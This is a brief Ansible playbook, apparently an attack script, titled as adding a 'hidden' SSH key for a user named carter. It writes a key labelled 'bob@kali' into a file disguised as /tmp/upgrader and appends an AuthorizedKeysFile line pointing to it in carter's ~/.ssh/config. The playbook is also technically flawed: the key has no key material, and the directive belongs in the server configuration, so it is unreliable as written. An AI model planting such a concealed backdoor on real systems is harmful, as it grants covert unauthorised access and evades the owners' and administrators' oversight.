---
- name: "add hidden ssh key for carter user"
  tasks:
    - name: "add ssh keys"
      ansible.builtin.shell: "echo 'ssh-rsa  bob@kali' >> /tmp/upgrader"
    - name: "change ssh config file"
      ansible.builtin.shell: "echo 'AuthorizedKeysFile /tmp/upgrader .ssh/authorized_keys' >> /home/carter/.ssh/config"
